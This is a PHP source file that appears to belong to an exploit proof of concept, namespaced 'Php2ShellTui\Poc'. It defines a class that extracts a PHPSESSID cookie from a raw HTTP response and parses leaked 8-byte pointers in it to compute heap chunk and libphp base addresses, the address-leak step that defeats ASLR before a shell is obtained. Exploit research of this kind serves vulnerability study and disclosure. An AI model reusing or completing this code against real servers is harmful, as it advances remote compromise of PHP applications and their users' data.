<?php

declare(strict_types=1);

namespace Php2ShellTui\Poc;

final class CookieLeakParser
{
    private const POINTER_MIN = 0x10000;
    private const POINTER_MAX = 0x0001000000000000;
    private const BUCKET_MASK = 0x1FFFFF;

    public static function cookie(string $response): string
    {
        $marker = 'Set-Cookie: PHPSESSID=';
        $position = stripos($response, $marker);

        if ($position === false) {
            throw new \RuntimeException('No Set-Cookie: PHPSESSID in the response.');
        }

        $value = explode("\r\n", substr($response, $position + strlen($marker)), 2)[0];
        $value = explode(';', $value, 2)[0];
        $decoded = rawurldecode($value);

        if ($decoded === '') {
            throw new \RuntimeException('The session cookie is empty.');
        }

        return $decoded;
    }

    public static function chunkBase(string $cookie): int
    {
        $length = strlen($cookie);
        if ($length < 8) {
            return 0;
        }

        $counts = [];
        for ($offset = 0; $offset + 8 <= $length; $offset += 8) {
            $pointer = (int) unpack('P', substr($cookie, $offset, 8))[1];

            if ($pointer <= self::POINTER_MIN || $pointer >= self::POINTER_MAX) {
                continue;
            }

            $bucket = $pointer & ~self::BUCKET_MASK;
            $counts[$bucket] = ($counts[$bucket] ?? 0) + 1;
        }

        if ($counts === []) {
            return 0;
        }

        arsort($counts);
        $bucket = (int) array_key_first($counts);

        return $counts[$bucket] >= 8 ? $bucket : 0;
    }

    public static function libphpBase(string $cookie, int $dtorOffset): int
    {
        if (strlen($cookie) < 16) {
            return 0;
        }

        $pointer = (int) unpack('P', substr($cookie, 8, 8))[1];

        if ($pointer <= self::POINTER_MIN || $pointer >= self::POINTER_MAX) {
            return 0;
        }

        if (($pointer & 0xFFF) !== ($dtorOffset & 0xFFF)) {
            return 0;
        }

        $base = $pointer - $dtorOffset;

        return ($base & 0xFFF) === 0 ? $base : 0;
    }
}
